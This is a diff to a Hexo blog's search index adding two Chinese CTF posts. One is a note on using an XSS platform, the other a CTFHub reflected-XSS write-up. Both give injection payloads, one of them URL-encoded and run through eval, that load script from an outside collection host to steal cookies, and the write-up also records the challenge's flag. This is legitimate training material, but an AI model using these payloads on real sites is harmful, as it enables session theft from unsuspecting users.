@@ -4,6 +4,64 @@
   
     
     <entry>
+      <title>XSSplatform</title>
+      <link href="/2021/12/05/XSSplatform/"/>
+      <url>/2021/12/05/XSSplatform/</url>
+      
+        <content type="html"><![CDATA[<p>将如下代码植入怀疑出现xss的地方（注意’的转义），即可在 项目内容 观看XSS效果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/textarea&gt;&#x27;&quot;&gt;&lt;script src=http://xsscom.com//a0zR72&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/textarea&gt;&#x27;&quot;&gt;&lt;img src=# id=xssyou style=display:none onerror=eval(unescape(/var%20b%3Ddocument.createElement%28%22script%22%29%3Bb.src%3D%22http%3A%2F%2Fxsscom.com%2F%2Fa0zR72%22%3B%28document.getElementsByTagName%28%22HEAD%22%29%5B0%5D%7C%7Cdocument.body%29.appendChild%28b%29%3B/.source));//&gt;</span><br></pre></td></tr></table></figure><p>再或者以你任何想要的方式插入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xsscom.com//a0zR72</span><br></pre></td></tr></table></figure><p>再或者以你任何想要的方式插入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Web </tag>
+            
+            <tag> XSS </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>反射型XSS</title>
+      <link href="/2021/12/05/%E5%8F%8D%E5%B0%84%E5%9E%8BXSS/"/>
+      <url>/2021/12/05/%E5%8F%8D%E5%B0%84%E5%9E%8BXSS/</url>
+      
+        <content type="html"><![CDATA[<h1 id="一、寻找漏洞"><a href="#一、寻找漏洞" class="headerlink" title="一、寻找漏洞"></a>一、寻找漏洞</h1><p>在搜索框中随意输入字符，发现输入的字符直接出现在界面上。<br>然后输入特殊字符进行尝试</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="number">1</span>)&lt;/script&gt;</span><br><span class="line"><span class="comment">//括号里的1可以为任意字符，将显示在弹窗界面上</span></span><br></pre></td></tr></table></figure><p>出现了弹窗，表明网页没有对用户的输入进行处理，直接输出到界面上。<br>XSS漏洞出现。</p><h1 id="二、实施攻击"><a href="#二、实施攻击" class="headerlink" title="二、实施攻击"></a>二、实施攻击</h1><p>在第一个搜索框中输入下面构造的payload，并点击submit</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;/textarea&gt;&#x27;&quot;&gt;&lt;script src=http://xsscom.com//a0zR72&gt;&lt;/script&gt;</span><br><span class="line">//这个payload将执行http://xsscom.com//a0zR72下的项目代码</span><br></pre></td></tr></table></figure><p>然后在网页源代码中查找到这个payload是完整的，同时submit点击之后，URL发生改变。</p><p>将改变后的URL在第二个搜索框中输入并send</p><p>此时XSS platform收到了报文，在cookies中发现了flag</p><p>cookie : flag=ctfhub{3efc235465db70e45070d143}</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> WriteUp </tag>
+            
+            <tag> Web </tag>
+            
+            <tag> XSS </tag>
+            
+            <tag> CTFHub </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Hexo部署时Error: Spawn failed的解决办法</title>
       <link href="/2021/12/02/Hexo%E9%83%A8%E7%BD%B2%E6%97%B6Error-Spawn-failed%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/"/>
       <url>/2021/12/02/Hexo%E9%83%A8%E7%BD%B2%E6%97%B6Error-Spawn-failed%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/</url>
